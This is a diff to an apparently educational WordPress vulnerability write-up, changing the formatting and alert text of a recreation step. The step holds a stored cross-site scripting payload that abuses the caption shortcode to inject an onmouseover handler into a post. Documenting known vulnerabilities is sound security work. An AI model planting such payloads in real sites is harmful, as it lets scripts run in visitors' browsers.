@@ -16,9 +16,9 @@ Time spent: **X** hours spent in total
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
     -Get posting privileges from admin, then exploit how HTML is processed and paste the following code onto the post: 
-    '''
-     <a href="[caption code=">]</a><a title=" onmouseover=alert('hacked!!!')  ">link</a>
-    '''
+    ```
+     <a href="[caption code=">]</a><a title=" onmouseover=alert('exploited')  ">link</a>
+    ```
 
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
